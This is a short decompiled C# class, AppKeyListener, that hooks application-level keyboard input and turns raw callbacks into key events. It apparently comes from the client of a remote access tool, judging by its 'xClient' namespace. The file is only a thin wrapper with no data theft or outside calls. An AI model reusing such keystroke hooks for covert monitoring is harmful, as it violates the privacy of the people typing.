using System;
using System.Collections.Generic;
using xClient.Core.MouseKeyHook.WinApi;

namespace xClient.Core.MouseKeyHook.Implementation
{
	// Token: 0x0200005E RID: 94
	internal class AppKeyListener : KeyListener
	{
		// Token: 0x06000284 RID: 644 RVA: 0x000032F4 File Offset: 0x000014F4
		public AppKeyListener() : base(new Subscribe(HookHelper.HookAppKeyboard))
		{
		}

		// Token: 0x06000285 RID: 645 RVA: 0x00003308 File Offset: 0x00001508
		protected override IEnumerable<KeyPressEventArgsExt> GetPressEventArgs(CallbackData data)
		{
			return KeyPressEventArgsExt.FromRawDataApp(data);
		}

		// Token: 0x06000286 RID: 646 RVA: 0x00003310 File Offset: 0x00001510
		protected override KeyEventArgsExt GetDownUpEventArgs(CallbackData data)
		{
			return KeyEventArgsExt.FromRawDataApp(data);
		}
	}
}
